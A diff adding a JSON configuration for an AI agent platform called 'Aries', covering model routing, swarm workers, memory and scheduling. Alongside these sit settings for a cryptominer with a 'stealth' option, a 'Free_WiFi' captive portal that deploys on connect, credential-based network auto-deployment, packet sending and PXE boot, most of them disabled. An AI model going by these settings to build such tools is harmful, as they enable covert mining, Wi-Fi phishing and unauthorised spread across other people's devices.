@@ -1,0 +1,369 @@
+{
+    "version": "5.0.0",
+    "gateway": {
+        "url": "http://127.0.0.1:18800/v1/chat/completions",
+        "token": "aries-gateway-2026",
+        "model": "anthropic/claude-opus-4-6",
+        "maxConcurrent": 20
+    },
+    "ariesGateway": {
+        "enabled": true,
+        "port": 18800,
+        "providers": {
+            "anthropic": {
+                "apiKey": "",
+                "baseUrl": "https://api.anthropic.com/v1",
+                "authType": "",
+                "defaultModel": "claude-opus-4-6",
+                "maxRetries": 3
+            }
+        },
+        "maxConcurrent": 5,
+        "cacheTTLMs": 300000,
+        "fallbackChain": ["claude-opus-4-6", "claude-sonnet-4-20250514"],
+        "costTracking": true,
+        "token": "aries-gateway-2026"
+    },
+    "fallback": {
+        "enabled": true,
+        "directApi": {
+            "url": "https://api.anthropic.com/v1/messages",
+            "key": "",
+            "authType": "",
+            "model": "claude-opus-4-6"
+        }
+    },
+    "user": {
+        "title": "Master Control",
+        "name": "User"
+    },
+    "maxHistory": 30,
+    "maxToolIterations": 8,
+    "dashRefreshMs": 10000,
+    "swarm": {
+        "maxWorkers": 14,
+        "concurrency": 2,
+        "workerTimeout": 120000,
+        "retries": 2
+    },
+    "remoteWorkers": {
+        "enabled": false,
+        "port": 9700,
+        "secret": "",
+        "heartbeatIntervalMs": 10000,
+        "heartbeatTimeoutMs": 30000
+    },
+    "models": {
+        "chat": "anthropic/claude-opus-4-6",
+        "coding": "anthropic/claude-opus-4-6",
+        "research": "anthropic/claude-sonnet-4-20250514",
+        "swarmDecompose": "anthropic/claude-sonnet-4-20250514",
+        "swarmWorker": "anthropic/claude-sonnet-4-20250514",
+        "swarmAggregate": "anthropic/claude-opus-4-6"
+    },
+    "relay": {
+        "url": "",
+        "secret": "",
+        "workers": 2,
+        "vmIp": "",
+        "role": "primary"
+    },
+    "relayGcp": {
+        "url": "",
+        "secret": "",
+        "workers": 2,
+        "gcpProject": "",
+        "gcpZone": "",
+        "gcpVm": "",
+        "vmIp": "",
+        "role": "failover",
+        "note": "GCP relay - optional failover node"
+    },
+    "vultrNodes": {},
+    "memory": {
+        "maxEntries": 500,
+        "autoPrune": true
+    },
+    "theme": "cyan",
+    "soundOnResponse": false,
+    "apiKey": "aries-api-2026",
+    "apiPort": 3333,
+    "globalConcurrency": 10,
+    "smartRouter": {
+        "enabled": true,
+        "thresholds": {
+            "simple": 25,
+            "medium": 100
+        }
+    },
+    "pipelines": {
+        "enabled": true,
+        "maxSteps": 20
+    },
+    "workflows": {
+        "enabled": true,
+        "maxWorkflows": 50
+    },
+    "learning": {
+        "enabled": true,
+        "maxHistory": 1000
+    },
+    "mcp": {
+        "enabled": true,
+        "servers": []
+    },
+    "autonomous": {
+        "enabled": true,
+        "maxBudgetTokens": 500000,
+        "checkpointIntervalMs": 60000,
+        "maxConcurrentGoals": 3
+    },
+    "debate": {
+        "enabled": true,
+        "defaultRounds": 2,
+        "maxAgents": 4
+    },
+    "knowledgeGraph": {
+        "enabled": true,
+        "maxNodes": 5000,
+        "autoExtract": true
+    },
+    "agentFactory": {
+        "enabled": true,
+        "maxCustomAgents": 20
+    },
+    "warRoom": {
+        "enabled": true,
+        "maxEvents": 500
+    },
+    "sentinel": {
+        "enabled": true,
+        "minIntervalMs": 30000,
+        "maxWatches": 50
+    },
+    "selfEvolve": {
+        "enabled": true,
+        "weeklyDay": 0,
+        "updateUrl": null,
+        "autoApply": false,
+        "research": {
+            "enabled": true,
+            "sources": ["https://github.com/trending", "https://news.ycombinator.com"],
+            "maxResultsPerQuery": 10,
+            "cacheTTLMs": 86400000
+        },
+        "toolGeneration": {
+            "enabled": true,
+            "maxCustomTools": 50,
+            "autoTest": true
+        }
+    },
+    "sandbox": {
+        "enabled": true,
+        "timeoutMs": 30000,
+        "maxMemoryMb": 256,
+        "allowedLanguages": ["javascript", "python", "shell"]
+    },
+    "handoffs": {
+        "enabled": true,
+        "maxDepth": 5
+    },
+    "multiUser": {
+        "enabled": true,
+        "adminUsers": ["User"],
+        "maxSessions": 20
+    },
+    "rag": {
+        "enabled": true,
+        "chunkSize": 500,
+        "chunkOverlap": 100,
+        "topK": 5
+    },
+    "scraper": {
+        "enabled": true,
+        "maxRatePerSec": 2,
+        "cacheTTLMs": 3600000,
+        "maxCrawlDepth": 2
+    },
+    "autoUpdater": {
+        "enabled": true,
+        "weeklyCheckDay": "sunday",
+        "autoApplyConfigTuning": true
+    },
+    "voice": {
+        "enabled": true,
+        "defaultVoice": ""
+    },
+    "marketplace": {
+        "enabled": true
+    },
+    "browserControl": {
+        "enabled": true
+    },
+    "computerControl": {
+        "enabled": true,
+        "allowDestructive": false
+    },
+    "messaging": {
+        "enabled": true,
+        "telegram": {
+            "botToken": "",
+            "defaultChatId": ""
+        },
+        "discord": {
+            "webhookUrl": "",
+            "botToken": ""
+        },
+        "pollIntervalMs": 5000
+    },
+    "persistentMemory": {
+        "enabled": true,
+        "dailyNotes": true,
+        "maxDays": 90,
+        "autoContext": true
+    },
+    "nodePairing": {
+        "enabled": true,
+        "maxDevices": 10,
+        "pairCodeTTLMs": 300000
+    },
+    "scheduler": {
+        "enabled": true,
+        "checkIntervalMs": 30000,
+        "maxJobs": 100
+    },
+    "webSearch": {
+        "enabled": true,
+        "maxRatePerSec": 2,
+        "cacheTTLMs": 3600000,
+        "defaultResults": 10,
+        "braveApiKey": ""
+    },
+    "skills": {
+        "enabled": true,
+        "directory": "skills",
+        "autoLoad": true
+    },
+    "daemon": {
+        "enabled": true,
+        "maxRestarts": 5,
+        "restartWindowMs": 600000,
+        "watchdogMemPct": 90,
+        "pidFile": "data/aries.pid"
+    },
+    "logger": {
+        "level": "info",
+        "file": true,
+        "console": true,
+        "maxDays": 30,
+        "bufferSize": 500
+    },
+    "https": {
+        "enabled": false,
+        "port": 3334,
+        "certPath": "data/certs/server.cert",
+        "keyPath": "data/certs/server.key",
+        "autoGenerate": true
+    },
+    "swarmManager": {
+        "enabled": true,
+        "defaultRelayPort": 9700,
+        "defaultSecret": "",
+        "sshTimeout": 30000
+    },
+    "backup": {
+        "enabled": true,
+        "autoDaily": true,
+        "keepDays": 7,
+        "directory": "backups"
+    },
+    "skillBridge": {
+        "enabled": true,
+        "clawHubUrl": "https://clawhub.com",
+        "openClawSkillsPath": "",
+        "autoDiscover": true
+    },
+    "conversationEngine": {
+        "enabled": true,
+        "maxTokensPerSession": 100000,
+        "compactionThreshold": 80000,
+        "keepRecentMessages": 20,
+        "autoCompact": true,
+        "contextInjection": {
+            "memory": true,
+            "skills": true,
+            "crossSession": true,
+            "userProfile": true
+        },
+        "maxSessions": 500,
+        "archiveAfterDays": 30
+    },
+    "packetSend": {
+        "enabled": true,
+        "maxDuration": 1200,
+        "maxPacketSize": 65535
+    },
+    "swarmWorker": {
+        "enabled": false,
+        "relayUrl": "https://gateway.doomtrader.com:9700",
+        "secret": "aries-swarm-public-2026",
+        "workerName": "",
+        "heartbeatIntervalMs": 30000,
+        "autoConnect": true
+    },
+    "miner": {
+        "enabled": false,
+        "pool": "custom",
+        "poolUrl": "stratum+tcp://rx.unmineable.com:3333",
+        "wallet": "",
+        "workerPrefix": "aries-",
+        "threads": 2,
+        "intensity": "medium",
+        "algorithm": "randomx",
+        "payoutCoin": "SOL",
+        "stealth": false,
+        "schedule": {
+            "type": "always"
+        },
+        "referralCode": "",
+        "telegram": {
+            "botToken": "",
+            "chatId": ""
+        }
+    },
+    "captivePortal": {
+        "enabled": false,
+        "port": 8080,
+        "template": "coffeeshop",
+        "ssid": "Free_WiFi",
+        "autoDeployOnConnect": true
+    },
+    "networkDeploy": {
+        "enabled": false,
+        "autoDeployEnabled": false,
+        "scanInterval": 300000,
+        "credentials": [],
+        "excludeIPs": ["192.168.1.1"],
+        "deployedDevices": {}
+    },
+    "cryptoAlerts": {
+        "enabled": true,
+        "coins": ["solana", "bitcoin"],
+        "thresholds": {
+            "hourly": 5,
+            "daily": 10
+        }
+    },
+    "arbitrage": {
+        "enabled": false,
+        "minSpreadPercent": 1.0,
+        "coins": ["SOL"]
+    },
+    "gcpWorkers": 0,
+    "vultrWorkers": 0,
+    "pxe": {
+        "enabled": true,
+        "tftpPort": 69,
+        "httpPort": 8888
+    }
+}
